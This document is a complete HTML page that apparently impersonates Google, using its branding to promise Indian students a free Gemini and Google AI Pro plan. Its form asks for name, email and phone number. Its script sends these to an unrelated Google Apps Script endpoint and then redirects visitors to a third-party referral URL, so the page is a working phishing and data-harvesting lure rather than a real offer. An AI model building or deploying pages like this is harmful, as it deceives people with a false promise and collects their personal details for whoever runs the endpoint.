<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Gemini Offer</title>
    <!-- Use Tailwind CSS for a modern, utility-first approach to styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom CSS for a clean look */
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body {
            font-family: 'Inter', sans-serif;
        }
        /* Gradient for the button */
        .submit-btn {
            background-image: linear-gradient(to right, #4285F4, #34a853, #fbbc05, #ea4335);
            background-size: 200% 100%;
            transition: background-position 0.5s ease;
        }
        .submit-btn:hover {
            background-position: -100% 0;
        }
    </style>
    <meta property="og:title" content="Google Gemini — Free for Indian Students">
    <meta property="og:description" content="Claim your free ₹19,500 Google AI Pro plan with Gemini Advanced, NotebookLM Plus, Veo 3, and 2TB storage — until 15 Sept 2025.">
    <!-- Using a placeholder for a hypothetical, more creative Gemini-style logo -->
    <meta property="og:image" content="https://placehold.co/1200x630/4285F4/ffffff?text=Gemini+Offer">
    <meta property="og:url" content="https://tinyurl.com/Googlegeminioffer">
    <meta property="og:type" content="website">
</head>
<body class="bg-gradient-to-br from-indigo-100 to-white min-h-screen flex items-center justify-center p-4">
    <!-- Main container with a modern card-like appearance -->
    <div class="bg-white p-8 md:p-12 rounded-3xl shadow-2xl max-w-lg w-full text-center">
        <!-- Replaced the logo with the new URL and added an onerror fallback -->
        <div class="flex justify-center mb-6">
            <img src="https://ibb.co/Kx7w65PY" 
                 alt="Gemini Logo" 
                 class="h-16 w-auto" 
                 onerror="this.onerror=null; this.src='https://placehold.co/64x64/4285F4/FFFFFF?text=Logo';"/>
        </div>
        
        <h1 class="text-3xl font-bold text-gray-800 mb-4">Google Gemini Pro Offer</h1>
        <p class="text-lg text-gray-600 mb-8">
            Claim your free ₹19,500 Google AI Pro plan with Gemini Advanced, NotebookLM Plus, Veo 3, and 2TB storage.
        </p>
        
        <form id="studentForm">
            <!-- Form group for name -->
            <div class="mb-5 text-left">
                <label for="name" class="block text-gray-700 font-semibold mb-2">Full Name</label>
                <input type="text" id="name" name="name" required
                       class="w-full px-5 py-3 border border-gray-300 rounded-xl shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-200">
            </div>
            <!-- Form group for email -->
            <div class="mb-5 text-left">
                <label for="email" class="block text-gray-700 font-semibold mb-2">Email Address</label>
                <input type="email" id="email" name="email" required
                       class="w-full px-5 py-3 border border-gray-300 rounded-xl shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-200">
            </div>
            <!-- Form group for phone -->
            <div class="mb-8 text-left">
                <label for="phone" class="block text-gray-700 font-semibold mb-2">Phone Number</label>
                <input type="tel" id="phone" name="phone" required
                       class="w-full px-5 py-3 border border-gray-300 rounded-xl shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-200">
            </div>
            
            <!-- A more aesthetic button with a gradient and hover effect -->
            <button type="submit" class="submit-btn text-white font-bold py-4 px-6 rounded-xl shadow-lg hover:shadow-xl focus:outline-none focus:ring-4 focus:ring-blue-500/50 w-full text-lg">
                Submit and Claim Offer
            </button>
        </form>
        
        <p id="message" class="mt-8 text-blue-600 font-medium"></p>
    </div>

<script>
        const form = document.getElementById('studentForm');
        const message = document.getElementById('message');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = new FormData(form);
            
            // Format the data as URLSearchParams
            const params = new URLSearchParams();
            params.append('name', formData.get('name'));
            params.append('email', formData.get('email'));
            params.append('phone', formData.get('phone'));

            const webAppUrl = 'https://script.google.com/macros/s/AKfycbzA_hdWpNxLd-rmWZwzz7Rw6iShG0YgZAjAuqprvP5eIH3qAgGdZFlADDE2xyldGkuL/exec';

            message.textContent = 'Submitting...';

            try {
                const response = await fetch(webAppUrl, {
                    method: 'POST',
                    body: params
                });

                if (response.ok) {
                    message.textContent = 'Success! Redirecting you now...';
                    window.location.href = "https://aiskillshouse.com/student/qr-mediator.html?uid=1544&promptId=6";
                } else {
                    message.textContent = 'Submission failed. Please try again.';
                }

            } catch (error) {
                console.error('Error:', error);
                message.textContent = 'An error occurred. Please try again.';
            }
        });
    </script>
</body>
</html>
